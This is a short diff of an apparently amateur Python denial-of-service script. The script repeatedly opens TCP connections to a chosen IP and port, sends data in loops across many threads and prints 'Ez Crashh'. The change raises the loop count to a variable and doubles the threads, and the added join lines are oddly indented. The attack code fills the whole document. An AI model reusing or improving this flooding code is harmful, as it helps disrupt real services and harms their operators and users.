@@ -144,7 +144,7 @@ def start2():
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((str(ip),int(port)))
                s.send(byte_host)
-               for i in range(20000):
+               for i in range(pack):
                    s.connect((str(ip),int(port)))
                    s.send(byte_host)
                    xx += random.randint(0, int(pack))
@@ -182,6 +182,11 @@ def start():
             s.close()
             print("Ez Crashh")
 for i in range(th):
-  th = threading.Thread(target=start)
-  th.start()
+  th1 = threading.Thread(target=start)
+  th2 = threading.Thread(target=start)
+  th1.start()
+  th2.start()
+
+ th1.join()
+ th2.join()
   #aku mah pemula bisa apa?
